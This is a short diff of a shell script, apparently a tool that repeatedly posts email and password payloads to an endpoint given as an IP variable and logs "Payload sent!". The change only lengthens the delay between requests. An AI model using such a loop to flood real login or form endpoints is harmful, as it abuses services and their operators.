@@ -92,7 +92,7 @@ if [ "$AMODE" -eq "1" ]; then
         --data-urlencode "email=${EMAILPAYLOAD}" \
         --data-urlencode "password=${PASSPAYLOAD}" \
         "http://${EPIP}/get"
-        sleep .5
+        sleep 1
     done
     LOG green "Payload sent!"
     sleep 1.5
